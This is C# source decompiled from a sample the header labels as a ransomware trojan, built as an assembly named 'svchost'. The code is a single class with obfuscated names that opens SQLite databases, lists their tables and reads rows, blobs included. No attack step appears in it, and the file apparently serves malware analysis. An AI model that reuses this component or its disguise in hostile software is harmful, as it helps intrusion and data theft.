// Decompiled with JetBrains decompiler
// Type: JmHh11oWVNZq5.W21jt60
// Assembly: svchost, Version=3.6.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A77B6346-3D8E-49C8-9445-FA550F2D4E61
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00019-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-9e7465e5d6bd41a7ae109a189729329f5b3b9f4c7694553dcd5941a98f8c38e1.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Data;
using System.Runtime.InteropServices;
using System.Text;

namespace JmHh11oWVNZq5
{
  public class W21jt60
  {
    private const int SQL_OK = 0;
    private const int SQL_ROW = 100;
    private const int SQL_DONE = 101;
    private IntPtr \u0039Pje0183;

    public W21jt60() => this.\u0039Pje0183 = IntPtr.Zero;

    public W21jt60(string baseName) => this.I5Fg0258(baseName);

    [DllImport("kernel32", EntryPoint = "HeapAlloc")]
    private static extern IntPtr AqZWR239(IntPtr heap, uint flags, uint bytes);

    [DllImport("kernel32", EntryPoint = "GetProcessHeap")]
    private static extern IntPtr Rj5D5240();

    [DllImport("kernel32", EntryPoint = "lstrlen")]
    private static extern int FMcfd241(IntPtr str);

    [DllImport("sqlite3", EntryPoint = "sqlite3_open")]
    private static extern int joXSS242(IntPtr fileName, out IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_close")]
    private static extern int z3NY2243(IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_exec")]
    private static extern int J785p244(
      IntPtr database,
      IntPtr query,
      IntPtr callback,
      IntPtr arguments,
      out IntPtr errorr);

    [DllImport("sqlite3", EntryPoint = "sqlite3_errmsg")]
    private static extern IntPtr \u0034Toks245(IntPtr database);

    [DllImport("sqlite3", EntryPoint = "sqlite3_prepare_v2")]
    private static extern int Qyjoc246(
      IntPtr database,
      IntPtr query,
      int length,
      out IntPtr statement,
      out IntPtr tail);

    [DllImport("sqlite3", EntryPoint = "sqlite3_step")]
    private static extern int T5ShL247(IntPtr statement);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_count")]
    private static extern int PKpvl248(IntPtr statement);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_name")]
    private static extern IntPtr y58rT249(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_type")]
    private static extern int xC0U8250(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_int")]
    private static extern int KbZd0251(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_double")]
    private static extern double LoSNn252(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_text")]
    private static extern IntPtr K5zFY253(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_blob")]
    private static extern IntPtr uawcc254(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_bytes")]
    private static extern IntPtr ZHCKR255(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_table_name")]
    private static extern IntPtr ZLWqU256(IntPtr statement, int columnNumber);

    [DllImport("sqlite3", EntryPoint = "sqlite3_finalize")]
    private static extern int dxofs257(IntPtr handle);

    public void I5Fg0258(string baseName)
    {
      if (W21jt60.joXSS242(this.ovgcM265(baseName), out this.\u0039Pje0183) != 0)
      {
        this.\u0039Pje0183 = IntPtr.Zero;
        throw new Exception("Error with opening database " + baseName + "!");
      }
    }

    public void qSC8A259()
    {
      if (!(this.\u0039Pje0183 != IntPtr.Zero))
        return;
      W21jt60.z3NY2243(this.\u0039Pje0183);
    }

    public ArrayList svttp260()
    {
      DataTable dataTable = this.\u0033yfl1262("SELECT name FROM sqlite_master WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'UNION ALL SELECT name FROM sqlite_temp_master WHERE type IN ('table','view') ORDER BY 1");
      ArrayList arrayList = new ArrayList();
      try
      {
        foreach (DataRow row in dataTable.Rows)
          arrayList.Add((object) row.ItemArray[0].ToString());
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      return arrayList;
    }

    public void n6NH9261(string query)
    {
      IntPtr errorr;
      W21jt60.J785p244(this.\u0039Pje0183, this.ovgcM265(query), IntPtr.Zero, IntPtr.Zero, out errorr);
      if (errorr != IntPtr.Zero)
        throw new Exception("Error with executing non-query: \"" + query + "\"!\n" + this.\u00364u9o266(W21jt60.\u0034Toks245(errorr)));
    }

    public DataTable \u0033yfl1262(string query)
    {
      IntPtr statement;
      W21jt60.Qyjoc246(this.\u0039Pje0183, this.ovgcM265(query), this.\u0037KH6o268(this.ovgcM265(query)), out statement, out IntPtr _);
      DataTable table = new DataTable();
      int num = this.\u0030rrS9263(statement, ref table);
      while (num == 100)
        num = this.cGjdg264(statement, ref table);
      W21jt60.dxofs257(statement);
      return table;
    }

    private int \u0030rrS9263(IntPtr statement, ref DataTable table)
    {
      table = new DataTable("resultTable");
      if (W21jt60.T5ShL247(statement) == 100)
      {
        int num1 = W21jt60.PKpvl248(statement);
        object[] objArray = new object[checked (num1 - 1 + 1)];
        int num2 = checked (num1 - 1);
        int columnNumber = 0;
        while (columnNumber <= num2)
        {
          string columnName = this.\u00364u9o266(W21jt60.y58rT249(statement, columnNumber));
          int num3 = W21jt60.xC0U8250(statement, columnNumber);
          if (num3 == Conversion.Fix(1))
          {
            table.Columns.Add(columnName, Type.GetType("System.Int32"));
            objArray[columnNumber] = (object) W21jt60.KbZd0251(statement, columnNumber);
          }
          else if (num3 == Conversion.Fix(2))
          {
            table.Columns.Add(columnName, Type.GetType("System.Single"));
            objArray[columnNumber] = (object) W21jt60.LoSNn252(statement, columnNumber);
          }
          else if (num3 == Conversion.Fix(3))
          {
            table.Columns.Add(columnName, Type.GetType("System.String"));
            objArray[columnNumber] = (object) this.\u00364u9o266(W21jt60.K5zFY253(statement, columnNumber));
          }
          else if (num3 == Conversion.Fix(4))
          {
            table.Columns.Add(columnName, Type.GetType("System.Array"));
            int siz = (int) W21jt60.ZHCKR255(statement, columnNumber);
            objArray[columnNumber] = (object) this.tht1x267(W21jt60.uawcc254(statement, columnNumber), siz);
          }
          else
          {
            table.Columns.Add(columnName, Type.GetType("System.String"));
            objArray[columnNumber] = (object) "";
          }
          checked { ++columnNumber; }
        }
        table.Rows.Add(objArray);
      }
      return W21jt60.T5ShL247(statement);
    }

    private int cGjdg264(IntPtr statement, ref DataTable table)
    {
      int num1;
      try
      {
        int num2 = W21jt60.PKpvl248(statement);
        object[] objArray = new object[checked (num2 - 1 + 1)];
        int num3 = checked (num2 - 1);
        int columnNumber = 0;
        while (columnNumber <= num3)
        {
          int num4 = W21jt60.xC0U8250(statement, columnNumber);
          if (num4 == Conversion.Fix(1))
            objArray[columnNumber] = (object) W21jt60.KbZd0251(statement, columnNumber);
          else if (num4 == Conversion.Fix(2))
            objArray[columnNumber] = (object) W21jt60.LoSNn252(statement, columnNumber);
          else if (num4 == Conversion.Fix(3))
            objArray[columnNumber] = (object) this.\u00364u9o266(W21jt60.K5zFY253(statement, columnNumber));
          else if (num4 == Conversion.Fix(4))
          {
            int siz = (int) W21jt60.ZHCKR255(statement, columnNumber);
            objArray[columnNumber] = (object) this.tht1x267(W21jt60.uawcc254(statement, columnNumber), siz);
          }
          else
            objArray[columnNumber] = (object) "";
          checked { ++columnNumber; }
        }
        table.Rows.Add(objArray);
        num1 = W21jt60.T5ShL247(statement);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return num1;
    }

    private IntPtr ovgcM265(string str)
    {
      if (str == null)
        return IntPtr.Zero;
      byte[] bytes1 = Encoding.UTF8.GetBytes(str);
      int bytes2 = checked (bytes1.Length + 1);
      IntPtr num = W21jt60.AqZWR239(W21jt60.Rj5D5240(), 0U, checked ((uint) bytes2));
      Marshal.Copy(bytes1, 0, num, bytes1.Length);
      Marshal.WriteByte(num, bytes1.Length, (byte) 0);
      return num;
    }

    private string \u00364u9o266(IntPtr ptr)
    {
      if (ptr == IntPtr.Zero)
        return (string) null;
      Encoding utF8 = Encoding.UTF8;
      int num = this.\u0037KH6o268(ptr);
      byte[] numArray = new byte[checked (num - 1 + 1)];
      Marshal.Copy(ptr, numArray, 0, num);
      return utF8.GetString(numArray, 0, num);
    }

    private Array tht1x267(IntPtr ptr, int siz)
    {
      if (ptr == IntPtr.Zero)
        return (Array) null;
      Encoding utF8 = Encoding.UTF8;
      this.\u0037KH6o268(ptr);
      byte[] destination = new byte[checked (siz - 1 + 1)];
      Marshal.Copy(ptr, destination, 0, siz);
      return (Array) destination;
    }

    private int \u0037KH6o268(IntPtr ptr) => ptr == IntPtr.Zero ? 0 : W21jt60.FMcfd241(ptr);

    public enum ZrJYo61
    {
      INT = 1,
      FLOAT = 2,
      TEXT = 3,
      BLOB = 4,
      NULL = 5,
    }
  }
}
